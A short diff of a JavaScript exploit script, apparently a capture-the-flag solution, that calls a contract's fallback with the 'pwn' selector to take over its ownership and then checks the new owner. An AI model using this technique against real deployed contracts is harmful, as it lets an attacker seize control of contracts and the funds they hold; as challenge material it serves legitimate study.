@@ -17,13 +17,10 @@ Runner.run(async (provider, owner) => {
     // fallback, setting the owner of the calling contract 
     console.log("calling fallback...");
     
-    //const callSig = new ethers.utils.Interface(["function pwn()"]).encodeFunctionData("pwn", []); 
-    const callSig = utils.encodeFunctionSignature("pwn");
-    
     await owner.sendTransaction({
         to: contractAddr,
         from: owner.address, 
-        data: callSig,
+        data: utils.encodeFunctionSignature("pwn"),
     });
     
     //verify the new owner 
